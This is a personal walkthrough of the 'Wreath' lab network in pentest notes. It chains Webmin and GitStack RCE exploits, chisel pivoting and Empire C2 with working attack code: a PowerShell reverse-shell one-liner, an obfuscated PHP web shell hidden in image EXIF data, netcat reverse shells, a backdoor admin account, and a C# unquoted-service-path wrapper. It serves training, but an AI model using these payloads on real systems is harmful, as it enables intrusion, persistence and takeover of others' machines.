202303080951
Status: #idea
Tags:

# Wreath
IP: 10.200.81.200

## Recon

Ports open:

```
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
9090/tcp  closed zeus-admin
10000/tcp open   snet-sensor-mgmt
```

Port 10000:
- A full nmap scan indicates the service is MiniServ 1.890 (Webmin httpd)
- RCE exploit found for webmin version 1.890: `cve-2019-15107`
- PoC:

![[wreath_poc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_poc.png">

## Establish Foothold

- Utilizing the exploit, we were able to grab root's private ssh key
- Using the key we were able to login as root via SSH
- Considering that we have a network with multiple hosts, we can transfer `nmap` to try and scan for other hosts
- Hosts discovered:

```bash
ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
ip-10-200-81-200.eu-west-1.compute.internal (10.200.81.200)
```

- It seems that `10.200.81.150` is the only one that returned ports open

```
Nmap scan report for ip-10-200-81-150.eu-west-1.compute.internal (10.200.81.150)
Host is up (0.00058s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

- We could possibly try to do a service scan through a proxy using chisel and proxychains
- I upload chisel to the compromised box to start a reverse socks proxy
- First, we want to start our chisel server on our attacker machine to listen

```bash
./chisel server -p 1337 --reverse
```

- Then we want to run the chisel client to establish the connection and complete the proxy on the victim machine

```bash
./chisel client $ATTACKER_IP:1337 R:socks &
```

- We should be able to see our successful connection:

![[wreath_chisel.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_chisel.png">

- Although we were listening on port 1337 for our chisel server, we can see that the proxy is going through localhost on port 1080
- We want to edit out proxychains config file at `/etc/proxychains4.conf`
- This is what our config file should look like

![[wreath_proxychains.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_proxychains.png">

- Now we can do some service version enumeration with nmap utilizing proxychains

```bash
proxychains nmap -sV -Pn -sT -p 80,3389,5985 10.200.81.150
```

- We can now see what the specific services and their respective versions are for the ports open on the internal ip `10.200.81.150`

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)

3389/tcp open  ms-wbt-server Microsoft Terminal Services

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

- Considering that 3389 is RDP and 5985 is winRM, we can instantly start enumerating port 80
- Either you can keep the proxy established and use proxychains with your browser to visit `10.200.81.150:80` or you can now do a remote port forward with chisel once again
- In this case, for learning purposes, we will do a remote port forward
- On our attacking machine we want to listen once again:

```bash
./chisel server -p 1337 --reverse
```

- On the victim machine we compromised, however, we want to run:

```bash
# You can choose whatever local port you want. 8000 was my choice
./chisel client $ATTACKER_IP:1337 R:8000:10.200.81.150:80
```

- Now open up your browser and visit `127.0.0.1:8000`, you can see we now have access to that machines website
- Immediately we see an error and realize that the program that is running the service is gitstack
- After running `searchsploit gitstack`, we find an RCE exploit
- Specifically, GitStack 2.3.10 - Remote Code Execution
- Now we copy this exploit to use it against the webserver. However, this script is using DOS line endings, which can cause problems in scripts when executed on linux
- We can convert it into Linux line endings with `dos2unix file.py`
- Now we can edit the ip variable and leave the command variable as it is to get a confirmed proof of concept.
- We can see:

```
$ python 43777.py          
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system"
```

- We successfully have RCE with this exploit

## Pivot

- Since we now have RCE, we can get a reverse shell sent from `10.200.81.150` to our first compromised host `10.200.81.200` 
- We can edit our exploit script's variable `command` with a powershell command that will return a reverse shell

```powershell
powershell.exe -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.81.200',15001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Then we can upload a static binary of netcat to the 200 host and start up a listener on port 15001
- However, we first have to allow the firewall to allow traffic to that port

```bash
firewall-cmd --zone=public --add-port 15001/tcp
```

- Finally, we run the exploit once again with our updated command and see that we were able to get a reverse shell

![[wreath_pivot.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_pivot.png">

- Since we know that ports 3389 and 5985 are open on this second compromised machine, and we are the highest authority, we can add a user account to utilize for authentication purposes
- This user will have to belong to the `Remote Desktop Users` group for RDP or the `Remote Management Users` group for WinRM. However, if the user is in the Administrators group, this will trump the RDP group
- Lets create our account and add it to the groups mentioned:

```
# Creates user
net user $USER $PASSWORD /add

# Adds user to specified groups
net localgroup Administrators $USER /add
net localgroup "Remote Management Users" $USER /add
```

- Since we now have a user to authenticate with, we can port forward both rdp and winrm ports to our local machine and then get a reliable shell or gui

![[wreath_reliableshell.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_reliableshell.png">

## Further Pivoting

- Now that we are in the `10.200.81.150` host, we can try to pivot into the `10.200.82.100` host
- Since nmap needs to be configured when using it with Windows, we will use a powershell script to do a port scan for the host since we know the ip to the third host we need to compromise
- However, instead of doing it manually, I will use the C2 Framework, `Empire`
- First we want to make sure the Empire server is running and start utilizing Empire

```bash
# Starts the Empire Server
sudo powershell-empire server

# Starts the Empire CLI
sudo powershell-empire client
```

- We can use Empire to do a portscan on the `10.200.81.100` host from the `10.200.81.150` host
- Since, we cannot have the `150` host directly connect back to us, we want to start two listeners, one that allows the connection establishment back to us, and the other called `hop-listener` to act as a "jump" server, which ultimately will just have the `150` host get back to us and vice versa
- lets start up the listeners in Empire:

```
# Use the http listener
(Empire:Listeners) > uselistener http

# You can enter 'options' to see what we can customize. However, the three important options we want to focus on are: Name, Host, Port
(Empire:uselistener/http) > set Name HTTP-CLI
(Empire:uselistener/http) > set Host 10.50.82.101 # This will be our machine
(Empire:uselistener/http) > set Port 9001 # Port of your choice
(Empire:uselistener/http) > execute # Starts the listener

# Use the http hop listener
(Empire:Listeners) > uselistener http_hop

# In this case, the only options that matters to us are: RedirectListener, Host, Port, and OutFolder
(Empire:uselistener/http_hop) > set RedirectListener HTTP-CLI # This is our first listener that we started
(Empire:uselistener/http_hop) > set Host 10.200.81.200 # This is the first host we compromised
(Empire:uselistener/http_hop) > set Port 16000 # Port of your choice
(Empire:uselistener/http_hop) > execute # Starts the listener
```

- Keep note of the `OutFolder` and what its value is
- In this case, all the php files are being put into `/tmp/http_hop`
- We need to transfer this `http_top` directory to our "jump" server (10.200.81.200)
- Here is how I did it:

```bash
cd /tmp/http_top
zip -r hop.zip *

# Start a python web server
python3 -m http.server 80

# On our "jump" server
cd /tmp/ && mkdir hop_files
cd hop_files
curl http://10.50.82.101/hop.zip -o hop.zip # Grabs our zip file from us
unzip hop.zip
```

- Now, since we know our "jump" server is hosting a website and utilizing php, we can use the php development webserver to serve these files:

```bash
php -S 0.0.0.0:16000 & # The port is the same as the one specified in the http_hop listener "Port" option

# NOTE: Make sure to allow traffic through that port on the "jump" server as such
firewall-cmd --zone=public --add-port 16000/tcp
``` 

- Now that everything is set up, we can go back to our Empire CLI and generate a stager
- A stager will allow us to execute code to commence the connection establishment back to our Empire CLI
- These are the steps taken to generate a stager via Empire:

```
(Empire:) > usestager multi_launcher
(Empire: usestager/multi/launcher) > set Listener http_hop # This is the hop listener we created
(Empire: usestager/multi/launcher) > execute
```

- We should now have our powershell code that we can execute on the `10.200.81.150` host via our winRM shell
- Once executed, we will see that we have a connection established

![[wreath_empire.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_empire.png">

- We can now interact with the agent as such `interact $ID`
- Now we can use a module called powershell_situational_awareness_network_portscan as such `usemodule powershell_situational_awareness_network_portscan`
- Make sure to edit the `Host` option and put the `10.200.81.100` host
- Finally, execute the module and we will get two ports that are open: `80, 3389`
- This next part is a bit redundant, here is a quick overview:
	- We want to access that webpage for that 3rd host
	- We can do another remote port forward using chisel
	- Upload the windows version of chisel to the `.150` host
	- Start a chisel server listening on a port on the `.200` host as such
		- `./chisel server -p 9002 --reverse &`
	- Finally connect back to the server from the `.150` host as such
		- `./chisel.exe client 10.200.81.200:9002 R:6969:10.200.81.100:80`
	- Now, we have to do another port forward
	- Start up a chisel server listening on a port on our attacker machine as such
		- `./chisel server -p 9003 --reverse`
	- Now, connect back to the chisel server from the `.200` host
		- `./chisel client 10.50.82.101:9003 R:6969:127.0.0.1:6969`
- Finally, this will complete the double-way port forward to be able to access `.100`'s website

- Immediately we notice that the website is a copy of the `.200` host website
- After enumerating on the `.200` host, we found the git directory that contained all the website's files at `C:\GitStack\repositories\Website.git`
- We transfer this directory utilizing `evil-winrm`
- Once the directory is transfered to our attacker machine, we can use GitTools to use an extractor tool that will obtain a readable format of the repository

```
# Make sure to be in the directory where our Website.git dir is at and name it .git
git clone https://github.com/internetwache/GitTools
./GitTools/Extractor/extractor.sh . Website
```

- Now you can go into the new `Website` directory and go through the php files that contain information on what the site has to offer.
- After some enumeration, we notice that there is a php file that filters extensions for an upload within the resources directory
- Visiting the `/resources` directory on the website, we see that it is in fact a location to upload files
- However, there seems to be two filters that we have to bypass: We have to bypass the extension filter by giving it something like `file.jpg.php` and we have to bypass the `size` checker that looks for a resemblance of an image by just sticking some php code into the exifdata of the image of our choice
- It would look like this:

```bash
exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" pic.jpeg.php
```

- This will add a comment line with the value being the php code
- `die()` is added to stop the rest of the image to be given as gibberish output
- We should have a success message when uploading this file
- When we visit `/resources/uploads/pic.jpeg.php`, we can see that it worked

![[wreath_uploadpoc.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/wreath_uploadpoc.png">

- Now that we know our code is being executed, we can start executing system commands on the `.100` host
- Here is a php payload that will allow to do that:

```php
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

- We need to obfuscate the payload using an online tool called PHP Obfuscator. You can find this resource at the bottom of this page
- Utilizing the tool, our new obfuscated code is:

```php
<?php $u0=$_GET[base64_decode('d3JlYXRo')];if(isset($u0)){echo base64_decode('PHByZT4=').shell_exec($u0).base64_decode('PC9wcmU+');}die();?>
```

- We can now update the exifdata for our file with a new name and re-upload the file
- To get a proof of concept, lets do: `http://127.0.0.1:6969/resources/uploads/shell.jpeg.php?wreath=whoami`
- We will see that the output does in fact return the user
- Now although we cannot ping the host, we can try and see if the host can ping us

```bash
sudo tcpdump icmp tun0

# Then try
http://127.0.0.1:6969/resources/uploads/shell.jpeg.php?wreath=ping+-n+1+10.50.82.101
```

- We see that we were able to get the icmp packets
- This means we can now try to get a reverse shell
- We upload a version of netcat that will not be detected by AV
- After uploading we can start a listener and establish a connection with netcat and wrapping it with powershell

```bash
# Attacker Machine
nc -nvlp 443

# RCE
http://127.0.0.1:6969/resources/uploads/shell.jpeg.php?wreath=powershell.exe+.\nc-charlie.exe+10.50.82.101+443+-e+cmd.exe
```

- Now we have a reverse shell

## Escalate Privileges

- Some manual enumeration is conducted first before trying to upload any type of tool like winPEAS. It may be a hassle due to AV
- First we look for services that are non-default

```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

- We find a service that seems to be vulnerable to an Unquoted Service Path Attack

```
# In the output, we can see the path is not quoted

System Explorer Service                                                             SystemExplorerHelpService                 
C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  
```

- Lets check to see what account is running this service

```
sc qc SystemExplorerHelpService
```

- We can see that the local system is running this account
- Now lets check to see what the permissions are for the directory

```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

- We can see we have write permissions, which mean we can put an executable in the `System Explorer` directory and restart the service to get a reverse shell
- Since AV is present, using msfvenom may be a pain, so lets generate a custom script and compile it

```cs
using System;
using System.Diagnostics;

// Compile with Mono - Ex: mcs wrapper.cs
namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\xampp\\htdocs\\resources\\uploads\\charlie.exe", "10.50.82.101 9005 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

- This will use the nc executable we uploaded and establish a connection back to us and get a reverse shell
- Compile it with the mono mcs compiler

```bash
mcs wrapper.cs
```

- You will see your new wrapper.exe file in the current directory
- Now transfer the file to the victim host and start up a listener on our own machine
- Rename the file to `System.exe` and place it in the `\System Explorer\` directory
- Finally, restart the service

```
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

- You should now have a reverse shell as system!


---
# References

- Git Tools - https://github.com/internetwache/GitTools
- PHP Obfuscator - https://www.gaijin.at/en/tools/php-obfuscator